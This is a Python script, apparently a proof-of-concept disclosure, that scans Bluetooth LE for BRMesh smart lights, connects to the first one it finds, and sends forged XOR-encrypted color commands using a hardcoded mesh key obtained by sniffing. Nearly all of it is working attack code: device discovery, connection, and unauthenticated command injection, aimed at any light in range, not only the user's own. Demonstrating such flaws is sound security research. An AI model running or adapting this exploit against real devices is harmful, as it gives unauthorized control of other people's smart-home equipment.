"""
Live Attack Demo - Scan and immediately attack discovered BRMesh lights
This demonstrates the vulnerability: passive sniffing → control without authorization
"""
import asyncio
from bleak import BleakScanner, BleakClient

MESH_KEY = bytes.fromhex('30323336')  # Extracted from passive sniffing!

def xor_encrypt(mesh_key, payload):
    """XOR encryption with repeating mesh key"""
    result = bytearray()
    for i, byte in enumerate(payload):
        result.append(byte ^ mesh_key[i % len(mesh_key)])
    return bytes(result)

def generate_color_command(red, green, blue, white):
    """Generate a color control command"""
    header = bytes([0x06, 0x0c, 0x00, 0xff, 0xff, 0xff, 0xff])
    payload = bytes([red, green, blue, white, 0x00, 0x00, 0x00, 0x06])
    
    # Encrypt header with magic constant
    magic = bytes.fromhex('c47b365e')
    encrypted_header = xor_encrypt(magic, header)
    
    # Encrypt payload with mesh key
    encrypted_payload = xor_encrypt(MESH_KEY, payload)
    
    return encrypted_header + encrypted_payload

async def find_brmesh_light():
    """Scan for BRMesh lights with 24-byte manufacturer data"""
    print("\n" + "="*70)
    print("🔍 PHASE 1: SCANNING FOR BRMESH LIGHTS")
    print("="*70)
    print("Looking for devices with manufacturer ID 0xfff0 and 24-byte data...")
    
    devices = await BleakScanner.discover(timeout=8, return_adv=True)
    
    found_lights = []
    for addr, (device, adv_data) in devices.items():
        if adv_data.manufacturer_data:
            for mfr_id, data in adv_data.manufacturer_data.items():
                if mfr_id == 0xfff0 and len(data) == 24:
                    found_lights.append((addr, device.name or "Unknown", adv_data.rssi, data.hex()))
                    print(f"\n⭐ FOUND BRMesh Light!")
                    print(f"   MAC: {addr}")
                    print(f"   Name: {device.name or 'Unknown'}")
                    print(f"   RSSI: {adv_data.rssi} dBm")
                    print(f"   Data: {data.hex()}")
    
    print(f"\n📊 Total BRMesh lights discovered: {len(found_lights)}")
    return found_lights

async def attack_light(target_mac):
    """Attempt to control the light"""
    print("\n" + "="*70)
    print("🎯 PHASE 2: ATTACKING DISCOVERED LIGHT")
    print("="*70)
    print(f"Target: {target_mac}")
    print(f"Using extracted mesh key: {MESH_KEY.hex()}")
    print("\nAttempting to connect and send: RED → BLUE → WHITE")
    
    try:
        print(f"\n🔌 Connecting to {target_mac}...")
        async with BleakClient(target_mac, timeout=15) as client:
            print(f"✅ Connected!")
            
            # Find the write characteristic
            services = client.services
            write_char = None
            
            for service in services:
                for char in service.characteristics:
                    if "write" in char.properties:
                        write_char = char.uuid
                        print(f"📝 Found write characteristic: {char.uuid}")
                        break
                if write_char:
                    break
            
            if not write_char:
                print("❌ Could not find write characteristic!")
                return False
            
            # Send color sequence
            colors = [
                ("RED", 255, 0, 0, 0),
                ("BLUE", 0, 0, 255, 0),
                ("WHITE", 0, 0, 0, 255)
            ]
            
            for name, r, g, b, w in colors:
                cmd = generate_color_command(r, g, b, w)
                print(f"\n🎨 Sending {name} command...")
                print(f"   Command: {cmd.hex()}")
                await client.write_gatt_char(write_char, cmd, response=False)
                print(f"   ✅ Sent!")
                await asyncio.sleep(2)
            
            print("\n" + "="*70)
            print("✅ ATTACK COMPLETE - Did your light change colors?")
            print("="*70)
            print("\n🚨 SECURITY IMPLICATIONS:")
            print("   • No authentication required")
            print("   • No authorization checks")
            print("   • Mesh key extracted from passive sniffing")
            print("   • Unauthorized device successfully controlled network")
            print("="*70)
            
            return True
            
    except Exception as e:
        print(f"\n❌ Attack failed: {e}")
        return False

async def main():
    print("\n" + "="*70)
    print("🔓 BRMESH SECURITY VULNERABILITY DEMONSTRATION")
    print("="*70)
    print("\nThis demonstrates a complete attack chain:")
    print("1. Passive BLE scanning (no interaction required)")
    print("2. Mesh key extraction from captured traffic")
    print("3. Unauthorized device control using extracted key")
    print("\n⚠️  Your computer is NOT part of the BRMesh network!")
    print("="*70)
    
    # Phase 1: Find lights
    lights = await find_brmesh_light()
    
    if not lights:
        print("\n❌ No BRMesh lights found!")
        print("💡 Make sure lights are powered on and try controlling them with your phone")
        return
    
    # Phase 2: Attack the first light found
    target_mac = lights[0][0]
    success = await attack_light(target_mac)
    
    if not success:
        print("\n💡 Light may have gone to sleep. Try again while actively controlling with your phone!")

if __name__ == "__main__":
    asyncio.run(main())
